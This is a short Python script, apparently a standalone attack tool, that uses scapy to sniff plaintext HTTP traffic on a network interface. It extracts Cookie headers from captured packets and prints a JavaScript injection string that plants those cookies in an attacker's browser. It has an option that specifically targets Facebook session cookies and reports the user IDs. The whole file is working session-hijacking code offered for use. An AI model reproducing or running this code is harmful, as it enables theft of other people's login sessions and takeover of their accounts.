#!/usr/bin/env python

import sys
from scapy.all import *
cookies_seen =()

def dictStringValue(raw_values):
	value = raw_values.split('=')
	return {value[0].strip():value[1].strip()}
	
def cookieIntoDict(raw_cookie):
	cookie_list = raw_cookie.split(';') 
	cookie = {}
	for element in cookie_list:
		try:
			cookie.update(dictStringValue(element))
		except IndexError:
			pass
	return cookie
	
def extractCookie(headers):
	raw_cookie =""
	for line in headers.split('\n'):   
		if 'Cookie:' in line:
			raw_cookie = line
	return cookieIntoDict(raw_cookie[len("Cookie: "):])
							 
def jsCookie(dictCookie):			
		return ''.join(['void(document.cookie="' + key + '=' + dictCookie[key]+ '");' for key in dictCookie.keys()])		

def printCookie(cookie):
	for key in cookie.keys():
		print "%s = %s" % (key,cookie[key])
	print "[*] Javascript Injection code:"
	print 'javascript:' + jsCookie(cookie) + '\n'
	
def sniffCookies(p):  
	 global cookies_seen
	 if 'Cookie:' in getattr(p,'load',''):
		cookie = extractCookie(p.load)
		if not "-f" in sys.argv and cookie not in cookies_seen:
			print "[+] New cookie seen: "
			printCookie(cookie)
		elif cookie.has_key("datr") and cookie.has_key("c_user") and cookie["c_user"] not in cookies_seen: # We have ourselves a facebook Cookie from a unseen profile 
			print "# Found cookie for facebook user %s:" % cookie["c_user"]
			printCookie(cookie)
			cookies_seen = cookies_seen + (cookie["c_user"],)
		cookies_seen = cookies_seen + (cookie,)

if __name__ == "__main__":						 		
	interface = sys.argv[1]	   
	sniff(iface=interface,filter="tcp port 80",prn=sniffCookies)